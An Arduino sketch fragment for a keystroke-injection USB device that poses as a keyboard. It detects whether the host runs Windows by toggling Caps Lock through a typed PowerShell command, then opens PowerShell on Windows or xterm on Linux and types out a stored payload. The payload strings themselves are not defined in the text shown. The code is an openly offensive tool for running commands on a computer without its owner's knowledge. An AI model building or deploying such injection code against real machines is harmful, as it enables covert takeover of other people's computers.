String fr2en(String text){
  int i = 0;
  String _en = " =qwertyuiopasdfghjkl;zxcvbnQWERTYUIOPASDFGHJKL:ZXCVBNm,./M<>?1234567890!@#$%^&*()",
         _fr = " =azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN,;:!?./ & \"'(- _  1234567890",
         str = "";
  while (text[i] != 0){
    str = str + (String)_en[_fr.indexOf((String)text[i++])];
  }
  return str;
}

boolean test_os_windows(){
  // if the capslock is already activated, desactivate it
  if (keyboard_leds & (1<<USB_LED_CAPS_LOCK)) // checks that the caps lock bit is set
  {
      // CapsLock is ON - put your "on" code here
      Keyboard.press(KEY_CAPS_LOCK);
      Keyboard.release(KEY_CAPS_LOCK);
  }
  // activate capslock via powershellpowershell -Command "(New-Object -ComObject WScript.Shell).SendKeys('{CAPSLOCK}')"
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("powershell -Command \"(New-Object -ComObject WScript.Shell).SendKeys('{CAPSLOCK}')\"\n");
  delay(1000);
  if (keyboard_leds & (1<<USB_LED_CAPS_LOCK)) // scroll lock is altered
  {
      // it's a window
      Keyboard.press(KEY_CAPS_LOCK);
      Keyboard.release(KEY_CAPS_LOCK);
      
      return true;
  }
  else{
      // not windows
      return false;
  }
}

void payload_windows(){
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.print("powershell\n");
    delay(1000);
    Keyboard.print(windows_file_to_light);
    digitalWrite(ledPin, LOW);
    delay(10000000);
}

void payload_linux(){
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("xterm\n");
  delay(1000);
  Keyboard.print(linux_file_to_light);
  
}
